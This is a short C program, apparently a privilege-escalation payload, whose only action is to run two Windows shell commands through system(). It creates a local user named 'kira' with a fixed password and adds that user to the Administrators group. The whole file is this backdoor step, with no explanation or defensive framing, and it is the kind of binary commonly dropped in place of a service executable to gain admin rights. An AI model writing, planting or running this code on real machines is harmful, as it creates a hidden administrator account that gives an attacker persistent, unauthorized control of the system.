#include <stdlib.h>

int main ()
{
	int i;
	i = system("net user kira kira_password /add");
	i = system("net localgroup administrators kira /add");

	return 0;
}
